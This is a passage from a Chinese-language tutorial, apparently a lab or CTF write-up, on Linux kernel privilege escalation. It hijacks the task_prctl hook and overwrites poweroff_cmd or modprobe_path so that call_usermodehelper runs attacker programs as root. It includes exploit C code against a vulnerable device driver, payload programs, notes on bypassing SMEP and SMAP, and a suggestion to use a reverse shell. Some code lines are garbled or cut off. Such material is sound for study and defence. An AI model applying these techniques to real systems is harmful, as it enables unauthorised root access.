@@ -1,0 +1,195 @@
+        argv = argv_split(GFP_KERNEL, cmd, NULL);
+        if (argv) {
+            ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+            argv_free(argv);
+        } else {
+            ret = -ENOMEM;
+        }
+        return ret;
+    }
+但是，它的第一个参数仍是`64-bit`下的指针，于是我们继续寻找调用链。
+可以看到定义在`/v4.6-rc1/source/kernel/reboot.c#L427`的`__orderly_poweroff`调用了`run_cmd`且其接受的参数为一个布尔值：
+    static int __orderly_poweroff(bool force)
+    {
+        int ret;
+        ret = run_cmd(poweroff_cmd);
+        if (ret && force) {
+            pr_warn("Failed to start orderly shutdown: forcing the issuen");
+            /*
+             * I guess this should try to kick off some daemon to sync and
+             * poweroff asap.  Or not even bother syncing if we're doing an
+             * emergency shutdown?
+             */
+            emergency_sync();
+            kernel_power_off();
+        }
+        return ret;
+    }
+那么我们只要能劫持`poweroff_cmd`，我们就可以执行任意命令
+而我们恰好可以在`/v4.6-rc1/source/kernel/reboot.c#L389`处找到如下定义：
+    char poweroff_cmd[POWEROFF_CMD_PATH_LEN] = "/sbin/poweroff";
+    static const char reboot_cmd[] = "/sbin/reboot";
+此处可以发现，`reboot_cmd`开启了`static const`标识符，这将导致我们无法通过劫持`__orderly_reboot`进行利用。
+#### 劫持`prctl`函数
+我们首先确定`prctl`函数的地址。
+接下来我们写一个小的实例程序来确定`hp->hook.task_prctl`位置
+    #include   
+    #include 
+    #include 
+    void exploit(){
+        prctl(0,0);
+    }
+    int main(int argc,char * argv[]){
+        if(argc > 1){
+            if(!strcmp(argv[1],"--breakpoint")){
+                printf("[%p]n",exploit);
+            }
+            return 0;
+        }
+        exploit();
+        return 0;
+    }
+我们在`security_task_prctl`函数处下断，然后逐步跟进，直到遇到调用`hp->hook.task_prctl`处。
+因此我们需要劫持的目标就是`0xFFFFFFFF81EB56B8`。
+#### 篡改`reboot_cmd`并调用`__orderly_reboot`
+首先查看确定`poweroff_cmd`和`__orderly_poweroff`的地址，结果发现内核中并没有该函数的地址，但是发现定义在`/v4.6-rc1/source/kernel/reboot.c#L450`的`poweroff_work_func`会调用`__orderly_poweroff`，且接受的参数并没有被利用：
+    static void poweroff_work_func(struct work_struct *work)
+    {
+        __orderly_poweroff(poweroff_force);
+    }
+那么我们转而试图去确定`poweroff_work_func`函数的地址。
+接下来我们开始调试，分别在`call_usermodehelper`和`poweroff_work_func`处下断
+我们事先编译一个`rootme`程序：
+    // gcc ./rootme.c -o rootme -static -fno-stack-protector
+    #include
+    int main(){
+        system("touch /tmp/test");
+        return 0;
+    }
+我们使用的`Exploit`如下：
+    // gcc ./exploit.c -o exploit -static -fno-stack-protector -masm=intel -lpthread
+    int write_mem(int fd, size_t addr,char *buff,int count)
+    {
+        struct seek_args s_args1;
+        struct write_args w_args;
+        int ret;
+        s_args1.new_pos=addr-0x10;
+        ret=ioctl(fd,0x8008FE0A,&s_args1);
+        w_args.buff=buff;
+        w_args.count=count;
+        ret=ioctl(fd,0x8008FE0B,&w_args);
+        return ret;
+    }
+    void exploit(){
+        int fd = open("/dev/vulnerable_device",0);
+        if (fd  1){
+            if(!strcmp(argv[1],"--breakpoint")){
+                printf("[%p]n",exploit);
+            }
+            return 0;
+        }
+        save_user_status();
+        exploit();
+        printf("[+] Done!n");
+        return 0;
+    }
+首先这里我们意外的发现，`poweroff_work_func`函数就已经直接调用`run_cmd`函数了，也就是说，`poweroff_work_func`函数其实就是`__orderly_poweroff`函数！
+接下来我们可以看到通过`call_usermodehelper`调用`/rootme`的具体参数布置。
+最后，我们看到，我们事先布置的`rootme`程序已被执行
+####  最终提权
+`call_usermodeheler`函数创建的新程序，实际上作为`keventd`内核线程的子进程运行，因此具有root权限。
+新程序被扔到内核工作队列`khelper`中进行执行。
+由于不好表征我们已经提权成功（可以选用反向`shell`），我们此处在文件系统的根目录设置一个`flag`文件，所属用户设置为`root`，权限设置为`700`。即在`Init`文件中添加
+    chown root /flag
+    chmod 700 /flag
+接下来我们替换`rootme`程序为一个更改`flag`权限的程序
+    #include
+    int main(){
+        printf("Exec command in root ing......");
+        system("chmod 777 /flag");
+        printf("Exec command end!");
+        return 0;
+    }
+再次运行`Exploit`
+####  姿势总结
+  1. 这种提权姿势最核心的就是劫持`hp->hook.task_prctl`函数指针执行任意代码，第一个传入参数只能是一个`32`位的变量。
+  2. `call_usermodehelper`可以很方便的以`root`权限启动任意程序，但是可能没有回显，因此可以考虑使用`reverse_shell`。
+  3. **这种方案不受`SMEP`、`SMAP`保护的影响！**
+#### 其他间接调用`call_usermodehelper`函数的函数
+  1. `__request_module`函数函数实现于`/v4.6-rc1/source/kernel/kmod.c#L124`
+        int __request_module(bool wait, const char *fmt, ...)
+    {
+        ......
+        ret = call_modprobe(module_name, wait ? UMH_WAIT_PROC : UMH_WAIT_EXEC);
+        atomic_dec(&kmod_concurrent);
+        return ret;
+    }
+    EXPORT_SYMBOL(__request_module);
+`call_modprobe`实现于`/v4.6-rc1/source/kernel/kmod.c#L69`
+        static int call_modprobe(char *module_name, int wait)
+    {
+        struct subprocess_info *info;
+        static char *envp[] = {
+            "HOME=/",
+            "TERM=linux",
+            "PATH=/sbin:/usr/sbin:/bin:/usr/bin",
+            NULL
+        };
+        char **argv = kmalloc(sizeof(char *[5]), GFP_KERNEL);
+        if (!argv)
+            goto out;
+        module_name = kstrdup(module_name, GFP_KERNEL);
+        if (!module_name)
+            goto free_argv;
+        argv[0] = modprobe_path;
+        argv[1] = "-q";
+        argv[2] = "--";
+        argv[3] = module_name;    /* check free_modprobe_argv() */
+        argv[4] = NULL;
+        info = call_usermodehelper_setup(modprobe_path, argv, envp, GFP_KERNEL,
+                         NULL, free_modprobe_argv, NULL);
+        if (!info)
+            goto free_module_name;
+        return call_usermodehelper_exec(info, wait | UMH_KILLABLE);
+    free_module_name:
+        kfree(module_name);
+    free_argv:
+        kfree(argv);
+    out:
+        return -ENOMEM;
+    }
+`modprobe_path`定义于`/v4.6-rc1/source/kernel/kmod.c#L61`
+        /*
+        modprobe_path is set via /proc/sys.
+    */
+    char modprobe_path[KMOD_PATH_LEN] = "/sbin/modprobe";
+于是我们只需要劫持`modprobe_path`然后执行`__request_module`即可，但是，此函数除了我们劫持函数指针来主动调用以外，我们还可以使用
+**运行一个错误格式的elf文件** 的方式来触发`__request_module`。
+我们可以使用如下`Exploit`：
+        void exploit(){
+        int fd = open("/dev/vulnerable_device",0);
+        if (fd argv[0], env->argv,
+                             env->envp, GFP_KERNEL,
+                             NULL, cleanup_uevent_env, env);
+            if (info) {
+                retval = call_usermodehelper_exec(info, UMH_NO_WAIT);
+                env = NULL;    /* freed by cleanup_uevent_env */
+            }
+        }
+    #endif
+        ......
+    }
+`init_uevent_argv`实现于`/source/lib/kobject_uevent.c#L129`
+        static int init_uevent_argv(struct kobj_uevent_env *env, const char *subsystem)
+    {
+        int len;
+        len = strlcpy(&env->buf[env->buflen], subsystem,
+                  sizeof(env->buf) - env->buflen);
+        if (len >= (sizeof(env->buf) - env->buflen)) {
+            WARN(1, KERN_ERR "init_uevent_argv: buffer size too smalln");
+            return -ENOMEM;
+        }
+        env->argv[0] = uevent_helper;
+        env->argv[1] = &env->buf[env->buflen];
+        env->argv[2] = NULL;
+        env->buflen += len + 1;
